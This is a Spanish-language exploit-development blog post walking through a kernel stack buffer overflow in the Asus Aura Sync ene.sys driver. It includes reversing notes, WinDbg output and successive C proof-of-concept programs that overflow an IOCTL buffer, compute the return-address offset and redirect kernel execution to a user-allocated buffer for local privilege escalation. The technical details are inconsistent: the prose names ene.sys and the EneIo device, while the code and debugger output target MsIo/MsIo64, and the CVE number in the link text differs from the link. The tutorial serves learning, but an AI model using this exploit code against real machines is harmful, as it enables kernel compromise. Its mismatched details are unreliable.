<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Stack Overflow</title>

  <meta name="description" content="Explotación de Stack Overflow en el driver ene.sys de Aura Sync">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Stack Overflow">
  <meta name="twitter:description" content="Explotación de Stack Overflow en el driver ene.sys de Aura Sync">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/exploit-development/windows-kernel/stack-overflow/image.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Stack Overflow">
  <meta property="og:description" content="Explotación de Stack Overflow en el driver ene.sys de Aura Sync">
  <meta property="og:image" content="/exploit-development/windows-kernel/stack-overflow/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploit-development/windows-kernel/stack-overflow/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Stack Overflow" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploit-development/windows-kernel" title="xchg2pwn" class="blog-button">Windows Kernel Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#reversing">Reversing</a></li>
        <li><a href="#crashing">Crashing</a></li>
        <li><a href="#offset">Offset</a></li>
        <li><a href="#exploit">Exploit</a></li>
    </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploit-development/windows-kernel/stack-overflow/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Stack Overflow</h2><br>
  </header>

<p class="plain-text">En este post se llevará a cabo la explotación de una de las vulnerabilidades más conocidas: un típico Stack Overflow pero esta vez en modo kernel, para ello usaremos usando el programa <a href="https://www.asus.com/mx/site/aura/sync.html">Asus Aura Sync</a>, una aplicación cuyo proposito es sincronizar los productos de <code class="language-plaintext highlighter-rouge">Asus</code> para controlar la iluminación <code class="language-plaintext highlighter-rouge">RGB</code>, de acuerdo con el <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17603">CVE-2019-17063</a> esta aplicación en versiones iguales o inferiores a la <code class="language-plaintext highlighter-rouge">1.07.71</code> tiene una vulnerabilidad en el driver <code class="language-plaintext highlighter-rouge">ene.sys</code> que se instala a la par del programa que contiene un manejo de datos incorrecto permitiendo escalar privilegios de forma local.</p>

<section class="post" id="reversing">
<br><h3 class="post-title">Reversing</h3><br>    

<p class="plain-text">Ahora deberiamos ser capaces de ver el modulo <code class="language-plaintext highlighter-rouge">ene</code> desde la máquina debugger</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">lm m ene
Browse full module list
start             end                 module name
fffff803`5c7f0000 fffff803`5c7f7000   ene        (no symbols)  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">!drvobj \driver\ene 2
Driver object (ffffdf0bc5cde310) is for:
 \Driver\Ene

DriverEntry:   fffff8035c7f6064	ene
DriverStartIo: 00000000	
DriverUnload:  fffff8035c7f14c0	ene
AddDevice:     00000000	

Dispatch routines:
[00] IRP_MJ_CREATE                      fffff8035c7f1100	ene+0x1100
[01] IRP_MJ_CREATE_NAMED_PIPE           fffff803401645d0	nt!IopInvalidDeviceRequest  
[02] IRP_MJ_CLOSE                       fffff8035c7f1100	ene+0x1100
[03] IRP_MJ_READ                        fffff803401645d0	nt!IopInvalidDeviceRequest
[04] IRP_MJ_WRITE                       fffff803401645d0	nt!IopInvalidDeviceRequest
[05] IRP_MJ_QUERY_INFORMATION           fffff803401645d0	nt!IopInvalidDeviceRequest
[06] IRP_MJ_SET_INFORMATION             fffff803401645d0	nt!IopInvalidDeviceRequest
[07] IRP_MJ_QUERY_EA                    fffff803401645d0	nt!IopInvalidDeviceRequest
[08] IRP_MJ_SET_EA                      fffff803401645d0	nt!IopInvalidDeviceRequest
[09] IRP_MJ_FLUSH_BUFFERS               fffff803401645d0	nt!IopInvalidDeviceRequest
[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    fffff803401645d0	nt!IopInvalidDeviceRequest
[0b] IRP_MJ_SET_VOLUME_INFORMATION      fffff803401645d0	nt!IopInvalidDeviceRequest
[0c] IRP_MJ_DIRECTORY_CONTROL           fffff803401645d0	nt!IopInvalidDeviceRequest
[0d] IRP_MJ_FILE_SYSTEM_CONTROL         fffff803401645d0	nt!IopInvalidDeviceRequest
[0e] IRP_MJ_DEVICE_CONTROL              fffff8035c7f1100	ene+0x1100</span>
</code></pre></div></div><br>

<p class="plain-text">Lo primero es entender como podemos comunicarnos con el driver, hay que entender que no podemos acceder a la memoria del espacio kernel sin embargo existe una interfaz del sistema operativo que permite esta comunicación, estas son las llamadas <code class="language-plaintext highlighter-rouge">ioctl</code>, cuando se instala un driver establece un nombre de dispositivo llamando a la función <code class="language-plaintext highlighter-rouge">IoCreateDevice</code>, utilizando IDA podemos desensamblar el driver y ver esta llamada en el bloque <code class="language-plaintext highlighter-rouge">DriverEntry</code>, el nombre asignado al driver es <code class="language-plaintext highlighter-rouge">\\.\EneIo</code></p>
<a href="/exploit-development/windows-kernel/stack-overflow/1.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/1.png"></p></div></a>

<a href="/exploit-development/windows-kernel/stack-overflow/2.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/2.png"></p></div></a>

<p class="plain-text">Cada función se identifica con un código <code class="language-plaintext highlighter-rouge">ioctl</code>, el driver acepta este tipo de llamadas usando estructuras de tipo <code class="language-plaintext highlighter-rouge">IRP</code> o <code class="language-plaintext highlighter-rouge">I/O Request Packets</code>, en este bloque podemos ver que la función establecida para encargarse de esta tarea es <code class="language-plaintext highlighter-rouge">sub_13f0</code></p>
<a href="/exploit-development/windows-kernel/stack-overflow/3.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/3.png"></p></div></a>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">sub_13f0</code> es encargada de ejecutar ciertas instrucciones dependiendo de su código <code class="language-plaintext highlighter-rouge">ioctl</code>, inicia accediendo a los miembros de la estructura <code class="language-plaintext highlighter-rouge">IRP</code> y realiza un par de comparaciones, compara el registro <code class="language-plaintext highlighter-rouge">al</code> con <code class="language-plaintext highlighter-rouge">0xe</code> que fue el offset con el que se establecio la función en el bloque pasado, si el resultado no es <code class="language-plaintext highlighter-rouge">0</code> salta al <code class="language-plaintext highlighter-rouge">ret</code> final</p>
<a href="/exploit-development/windows-kernel/stack-overflow/4.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/4.png"></p></div></a>

<p class="plain-text">Si la comparación resulta en <code class="language-plaintext highlighter-rouge">0</code> inicia una estructura de tipo <code class="language-plaintext highlighter-rouge">switch</code> para buscar la comparación con el código <code class="language-plaintext highlighter-rouge">ioctl</code> correspondiente, en este caso nos quedaremos con el primer código que es <code class="language-plaintext highlighter-rouge">0x80102040</code> y analizaremos lo que ejecuta al llamarlo</p>
<a href="/exploit-development/windows-kernel/stack-overflow/8.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/8.png"></p></div></a>

<p class="plain-text">El siguiente bloque nuevamente muestra un mensaje, y hace un salto condicional, si <code class="language-plaintext highlighter-rouge">ebx</code> es igual a <code class="language-plaintext highlighter-rouge">0</code> salta a <code class="language-plaintext highlighter-rouge">loc_1494</code> de lo contrario sigue la siguiente instrucción</p>
<a href="/exploit-development/windows-kernel/stack-overflow/5.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/5.png"></p></div></a>

<p class="plain-text">Siguiendo la linea roja vemos que se utiliza la función <code class="language-plaintext highlighter-rouge">memmove</code> sin sanitización aparente, esto parece interesante ya que controlamos los datos y si escribimos mas de lo que soporta el <code class="language-plaintext highlighter-rouge">buffer</code> podriamos desbordarlo y sobrescribir otros datos</p>
<a href="/exploit-development/windows-kernel/stack-overflow/6.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/6.png"></p></div></a>

<p class="plain-text">Después de copiar los datos vuelve al final de la función concluyendo en la instrucción <code class="language-plaintext highlighter-rouge">ret</code> del offset <code class="language-plaintext highlighter-rouge">0x16b9</code>, si sobrepasamos el buffer y sobrescribimos la dirección de retorno en este ultimo <code class="language-plaintext highlighter-rouge">ret</code> deberiamos tomar el control del flujo del programa</p>
<a href="/exploit-development/windows-kernel/stack-overflow/7.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/7.png"></p></div></a>

</section>
<section class="post" id="crashing">
<br><h3 class="post-title">Crashing</h3><br>

<p class="plain-text">Utilizando <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> podemos comunicarnos pasandole el handle y el código <code class="language-plaintext highlighter-rouge">ioctl</code> perteneciente a la función, además de ello el <code class="language-plaintext highlighter-rouge">buffer</code> que le pasaremos y su tamaño, el resto de parámetros los dejaremos como <code class="language-plaintext highlighter-rouge">NULL</code> ya que no nos interesan</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">BOOL </span><span class="na">DeviceIoControl</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">HANDLE</span><span class="p">       hDevice,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        dwIoControlCode,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">optional</span><span class="p">]      </span><span class="no">LPVOID</span><span class="p">       lpInBuffer,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        nInBufferSize,
  [</span><span class="mi">out</span><span class="p">, </span><span class="mi">optional</span><span class="p">]     </span><span class="no">LPVOID</span><span class="p">       lpOutBuffer,
  [</span><span class="mi">in</span><span class="p">]                </span><span class="no">DWORD</span><span class="p">        nOutBufferSize,
  [</span><span class="mi">out</span><span class="p">, </span><span class="mi">optional</span><span class="p">]     </span><span class="no">LPDWORD</span><span class="p">      lpBytesReturned,
  [</span><span class="mi">in</span><span class="p">, </span><span class="mi">out</span><span class="p">,</span><span class="mi"> optional</span><span class="p">] </span><span class="no">LPOVERLAPPED</span><span class="p"> lpOverlapped
);</span>
</code></pre></div></div><br>

<p class="plain-text">En un proyecto de <code class="language-plaintext highlighter-rouge">Visual Studio</code> definimos el siguiente código, iniciamos definiendo un buffer llamado <code class="language-plaintext highlighter-rouge">payload</code> con un tamaño de <code class="language-plaintext highlighter-rouge">100</code> bytes, (un poco más del buffer definido) el cual rellenaremos con <code class="language-plaintext highlighter-rouge">A's</code>, luego de eso lo enviamos al controlador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>

</span><span class="o">#define</span><span class="na"> IOCTL_STACK_OVERFLOW </span><span class="mi">0x80102040

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">MsIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 100</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlFillMemory(payload, </span><span class="mi">100</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload, </span><span class="mi">100</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Para ver lo que está haciendo el ultimo bloque reverseado estableceremos un <code class="language-plaintext highlighter-rouge">breakpoint</code> en la llamada a <code class="language-plaintext highlighter-rouge">memmove</code> y continuaremos la ejecución normal</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">bp MsIo64 + 0x1623  

</span><span class="ro">0: kd> </span><span class="p">g</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de compilar el proyecto nuestro exploit nos queda en un <code class="language-plaintext highlighter-rouge">.exe</code> que ejecutamos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">exploit.exe  </span>
</code></pre></div></div><br>

<p class="plain-text">Volviendo al debugger podemos ver que en el kernel hemos alcanzado el <code class="language-plaintext highlighter-rouge">breakpoint</code> a la llamada, analizaremos el comportamiento de esta llamada a <code class="language-plaintext highlighter-rouge">memmove</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
MsIo64+0x1623:
fffff800`22351623 e8b8010000      call    MsIo64+0x17e0 (fffff800`223517e0)  </span>
</code></pre></div></div><br>

<p class="plain-text">Según la documentación oficial de Microsoft, la función <a href="https://learn.microsoft.com/es-es/cpp/c-runtime-library/reference/memmove-wmemmove?view=msvc-170">memmove</a> recibe 3 argumentos, un puntero al buffer de destino, un puntero al source y un contador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">void </span><span class="o">*</span><span class="na">memmove</span><span class="p">(
    </span><span class="no">void </span><span class="o">*</span><span class="p">dest,
    </span><span class="o">const </span><span class="no">void </span><span class="o">*</span><span class="p">src,  
    </span><span class="na">size_t </span><span class="p">count
);</span>
</code></pre></div></div><br>

<p class="plain-text">Las <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">convenciones de llamada</a> en x64 nos dicen que los primeros 3 argumentos deberian estar en los registros <code class="language-plaintext highlighter-rouge">rcx</code>, <code class="language-plaintext highlighter-rouge">rdx</code> y <code class="language-plaintext highlighter-rouge">r8</code>, en <code class="language-plaintext highlighter-rouge">rcx</code> podemos ver el destino, en <code class="language-plaintext highlighter-rouge">rdx</code> el source o lo que se va a copiar y en <code class="language-plaintext highlighter-rouge">r8</code> el contador que son <code class="language-plaintext highlighter-rouge">100</code> bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">db rcx L40
ffffad00`2631f160  c8 00 00 00 00 00 00 00-f1 cd 41 1c 00 f8 ff ff  ..........A.....  
ffffad00`2631f170  01 00 00 00 00 00 00 00-49 6f 20 20 00 00 00 00  ........Io  ....  
ffffad00`2631f180  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................  
ffffad00`2631f190  0c 02 00 00 00 00 00 00-10 be 5b 35 09 da ff ff  ..........[5....  

</span><span class="ro">0: kd></span><span class="p"> db rdx L40
ffffda09`37c49f00  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
ffffda09`37c49f10  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
ffffda09`37c49f20  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
ffffda09`37c49f30  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  

</span><span class="ro">0: kd></span><span class="p"> ? r8
Evaluate expression: 100 = 00000000`00000064</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de ejecutar la llamada podemos ver que el contenido del buffer se ha copiado al destino, sin embargo hay que pensar que posiblemente el buffer definido sea mas pequeño que nuestro buffer, nosotros hemos escrito un total de <code class="language-plaintext highlighter-rouge">100</code> bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">p
MsIo64+0x1628:
fffff807`24da1628 488b542430      mov     rdx,qword ptr [rsp+30h]

</span><span class="ro">0: kd></span><span class="p"> db rcx L40
ffff8884`4013f160  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
ffff8884`4013f170  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
ffff8884`4013f180  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
ffff8884`4013f190  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  </span>
</code></pre></div></div><br>

<p class="plain-text">Avanzamos hazta el siguiente <code class="language-plaintext highlighter-rouge">ret</code> donde podemos ver que hemos sobrescrito la dirección de retorno con <code class="language-plaintext highlighter-rouge">0x4141414141414141</code> que es igual a las <code class="language-plaintext highlighter-rouge">A's</code> en hexadecimal, si intentamos continuar provocará un error ya que esa dirección no existe, de esta forma controlamos la dirección donde apuntará mediante un <code class="language-plaintext highlighter-rouge">Stack Buffer Overflow</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">pt
MsIo64+0x16b9:
fffff807`24da16b9 c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L1
ffff8884`4013f1a8  41414141`41414141

</span><span class="ro">0: kd></span><span class="p"> p
Access violation - code c0000005 (!!! second chance !!!)  
MsIo64+0x16b9:
fffff807`24da16b9 c3              ret</span>
</code></pre></div></div><br>

</section>
<section class="post" id="offset">
<br><h3 class="post-title">Offset</h3><br>

<p class="plain-text">Para encontrar la cantidad de bytes necesarios antes de sobrescribir la dirección de retorno crearemos un patrón de caractéres utilizando <code class="language-plaintext highlighter-rouge">cyclic</code> de pwntools</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cyclic </span><span class="p">-n 8 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa  </span>
</code></pre></div></div><br>

<p class="plain-text">Ahora en lugar de rellenar el buffer payload con <code class="language-plaintext highlighter-rouge">A's</code> copiaremos los <code class="language-plaintext highlighter-rouge">100</code> bytes creados con <code class="language-plaintext highlighter-rouge">cyclic</code> al buffer, después de ello compilamos el exploit</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>

</span><span class="o">#define</span><span class="na"> IOCTL_STACK_OVERFLOW </span><span class="mi">0x80102040

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">MsIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">CONST CHAR </span><span class="o">*</span><span class="p">cyclic</span><span class="o"> =</span><span class="s"> "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa"</span><span class="p">;  

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 100</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(payload, cyclic, </span><span class="mi">100</span><span class="p">);

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload,</span><span class="mi"> 100</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">El breakpoint ahora será directamente en el <code class="language-plaintext highlighter-rouge">ret</code> donde se produce la vulnerabilidad</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">bp MsIo64 + 0x16b9  

</span><span class="ro">0: kd></span><span class="p"> g</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de ejecutar el exploit podemos ver que la dirección de retorno ahora tiene como valor algunos de los bytes que contenia la cadena creada con <code class="language-plaintext highlighter-rouge">cyclic</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">exploit.exe  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">g
Breakpoint 0 hit
MsIo64+0x16b9:
fffff802`3e9f16b9 c3              ret  

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L1
ffff9582`3bd0f1a8  61616161`6161616a</span>
</code></pre></div></div><br>

<p class="plain-text">Ya con la dirección podemos calcular el offset nuevamente utilizando <code class="language-plaintext highlighter-rouge">cyclic</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cyclic </span><span class="p">-n 8 -l 0x616161616161616a  
72</span>
</code></pre></div></div><br>

<p class="plain-text">Sabemos que después de rellenar <code class="language-plaintext highlighter-rouge">72</code> bytes tenemos la dirección de retorno, entonces reservaremos un nuevo espacio llamado <code class="language-plaintext highlighter-rouge">shellcode</code> donde copiaremos un total de <code class="language-plaintext highlighter-rouge">64 C's</code>, luego el puntero a shellcode lo copiaremos a payload después de <code class="language-plaintext highlighter-rouge">72</code> A's por lo que el controlador deberia intentar ejecutar las <code class="language-plaintext highlighter-rouge">C's</code> en el <code class="language-plaintext highlighter-rouge">ret</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>

</span><span class="o">#define</span><span class="na"> IOCTL_STACK_OVERFLOW </span><span class="mi">0x80102040
</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">MsIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(NULL,</span><span class="mi"> 80</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(NULL,</span><span class="mi"> 64</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload,</span><span class="mi"> 72</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);
    RtlFillMemory(shellcode,</span><span class="mi"> 64</span><span class="p">,</span><span class="s"> 'C'</span><span class="p">);

    </span><span class="o">*</span><span class="p">((</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">) ((</span><span class="na">BYTE </span><span class="o">*</span><span class="p">) payload </span><span class="o">+</span><span class="mi"> 72</span><span class="p">)) </span><span class="o">= </span><span class="p">(</span><span class="na">QWORD</span><span class="p">) shellcode;

    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload,</span><span class="mi"> 80</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos el exploit y ahora la dirección de retorno apunta a <code class="language-plaintext highlighter-rouge">0x1ba7a380000</code> y esta dirección de memoria contiene las <code class="language-plaintext highlighter-rouge">C's</code> por lo que ya podemos ejecutar instrucciones</p>
